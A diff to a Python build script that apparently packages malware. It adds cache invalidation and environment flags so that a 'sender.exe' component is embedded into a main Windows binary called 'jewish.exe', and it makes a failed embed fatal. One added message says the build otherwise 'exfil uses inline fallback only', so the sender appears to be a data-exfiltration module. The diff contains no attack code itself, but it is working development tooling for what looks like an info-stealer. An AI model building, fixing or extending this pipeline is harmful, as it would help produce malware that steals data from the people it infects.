@@ -193,6 +193,24 @@ def generate_random_suffix():
     return random.randint(1000, 9999)
 
 
+def invalidate_jewish_build_cache():
+    """Force build.rs to re-run after sender.exe exists (avoids stale empty embed)."""
+    import glob
+    removed = 0
+    for pattern in (
+        os.path.join(PROJECT_ROOT, "target", "release", "build", "jewish-*"),
+        os.path.join(PROJECT_ROOT, "target", "x86_64-pc-windows-gnu", "release", "build", "jewish-*"),
+    ):
+        for path in glob.glob(pattern):
+            try:
+                shutil.rmtree(path)
+                removed += 1
+            except OSError as e:
+                print(f"[!] Could not remove build cache {path}: {e}")
+    if removed:
+        print(f"[*] Invalidated {removed} jewish build-script cache(s) for sender embed")
+
+
 # ===== BUILD COMMANDS =====
 
 def run_command(cmd: List[str], description: str, extra_env: dict = None) -> bool:
@@ -355,7 +373,7 @@ def main():
     if not run_command(
         _cargo_cmd + ["build", "--release", "--bin", "sender"] + _CARGO_EXTRA,
         "Building sender.exe",
-        extra_env={"SKIP_SENDER_EMBED": "1"},
+        extra_env={"SKIP_SENDER_EMBED": "1", "SENDER_EMBED_PASS": "sender"},
     ):
         print("[!] Sender build failed - aborting")
         sys.exit(1)
@@ -367,9 +385,11 @@ def main():
 
     # Step 4: Build main executable (embed sender built above — --bin jewish only)
     print("\n===== 3/7 Building jewish.exe =====")
+    invalidate_jewish_build_cache()
     env = {
         **os.environ,
         "SENDER_EXE": os.path.abspath(TARGET_SENDER),
+        "SENDER_EMBED_PASS": "main",
     }
     env.pop("SKIP_SENDER_EMBED", None)
     embed_ok = False
@@ -390,8 +410,10 @@ def main():
             print("[!] Main build failed - aborting")
             sys.exit(1)
         if not embed_ok:
-            print("[!] WARNING: sender.exe was NOT embedded in jewish.exe (inline fallback only)")
+            print("[!] FATAL: sender.exe was NOT embedded in jewish.exe")
             print(f"    Expected sender at: {env.get('SENDER_EXE')}")
+            print("[!] Run: git pull  then rebuild. Without embed, exfil uses inline fallback only.")
+            sys.exit(1)
         else:
             print(f"[+] Sender embedded from {env.get('SENDER_EXE')}")
     except Exception as e:
